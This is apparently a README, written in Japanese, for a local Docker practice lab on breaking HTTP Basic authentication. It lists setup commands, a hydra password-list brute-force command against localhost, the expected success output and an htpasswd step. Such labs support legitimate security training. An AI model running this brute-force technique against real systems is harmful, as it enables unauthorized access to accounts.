# Basic認証を突破する練習レポジトリ

## 立ち上げ

```
docker-compose build
docker-compsoe up
```

## コンテナの中に入ってhydra実行
```
docker exec -ti basic-auth /bin/bash
cd password-list/
hydra -l username -P password-list.txt localhost http-get /index.html
```

成功したら以下のようになる

```
[80][http-get] host: localhost   login: username   password: password
1 of 1 target successfully completed, 1 valid password found
```

## デバッグ用

### コンテナの中に入ってパスワード生成
```
docker exec -ti basic-auth /bin/bash
# 既存ファイルが上書きされるので注意
htpasswd -c /etc/nginx/.htpasswd [ユーザ名]
```
